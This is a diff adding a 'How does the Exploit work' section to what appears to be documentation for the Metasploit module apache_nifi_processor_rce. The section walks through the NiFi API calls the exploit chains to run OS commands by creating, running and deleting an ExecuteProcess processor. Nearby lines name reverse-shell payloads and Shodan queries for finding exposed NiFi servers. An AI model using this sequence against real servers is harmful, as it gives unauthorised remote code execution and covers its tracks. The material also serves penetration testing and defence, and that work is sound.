@@ -19,6 +19,69 @@ MetaSploit Windows Default Payload: **cmd/windows/reverse_powershell**
 Shodan Query: `title:"NiFi"`  
 Fofa Query: `title=="NiFi"`  
 
+# How does the Exploit work
+## GET /nifi-api/access/config: Used to check whether the target is running NiFi and whether authentication is required.  
+Example Output:
+<pre>
+{
+    "config": {
+	    "supportsLogin": true
+	}
+}</pre>
+
+## POST /nifi-api/access/token: Used to obtain an access token using supplied credentials (if authentication is required).  
+Content-Type: **application/x-www-form-urlencoded**  
+HTTP Parameters: **username, password**  
+| Status code  | Description |
+|---|---|
+| 200	| Successful operation. |
+| 400	|	NiFi was unable to complete the request because it was invalid. The request should not be retried without modification. |
+| 403	|	Client is not authorized to make this request. |
+| 409	|	Unable to create access token because NiFi is not in the appropriate state. (i.e. may not be configured to support username/password login. |
+| 500	|	Unable to create access token because an unexpected error occurred. |  
+
+## GET /nifi-api/process-groups/root: Used to obtain the ID of the root process group.  
+Example Output:
+<pre>
+{
+    "revision": {REDACTED},
+    "id": "value",
+    "uri": "value",
+    "position": {REDACTED},
+    "permissions": {REDACTED},
+    "bulletins": [{REDACTED}],
+    "disconnectedNodeAcknowledged": true,
+    "component": {REDACTED},
+    "status": {REDACTED},
+    "versionedFlowSnapshot": {REDACTED},
+    "runningCount": 0,
+    "stoppedCount": 0,
+    "invalidCount": 0,
+    "disabledCount": 0,
+    "activeRemotePortCount": 0,
+    "inactiveRemotePortCount": 0,
+    "versionedFlowState": "value",
+    "upToDateCount": 0,
+    "locallyModifiedCount": 0,
+    "staleCount": 0,
+    "locallyModifiedAndStaleCount": 0,
+    "syncFailureCount": 0,
+    "localInputPortCount": 0,
+    "localOutputPortCount": 0,
+    "publicInputPortCount": 0,
+    "publicOutputPortCount": 0,
+    "parameterContext": {REDACTED},
+    "inputPortCount": 0,
+    "outputPortCount": 0
+}
+</pre>
+## POST /nifi-api/process-groups/\<ROOT-PROCESSOR-GROUP-ID\>/processors: Used to create an ExecuteProcess processor in the root group.  
+Content Type: **application/json**  
+## PUT /nifi-api/processors/\<NEW-PROCESSOR-ID\>: Used to configure the new ExecuteProcess processor and run the OS command.
+## PUT /nifi-api/processors/\<NEW-PROCESSOR-ID\>/run-status: Used to stop the new ExecuteProcess processor prior to deletion.  
+## DELETE /nifi-api/processors/\<NEW-PROCESSOR-ID\>/threads: Used to terminate threads in case stopping failed.
+## DELETE /nifi-api/processors/\<NEW-PROCESSOR-ID\>: Used to delete the processor.
+
 ## Using apache_nifi_processor_rce's Exploit
 <pre>msf6 > use exploit/multi/http/apache_nifi_processor_rce
 [*] Using configured payload cmd/unix/reverse_bash</pre>
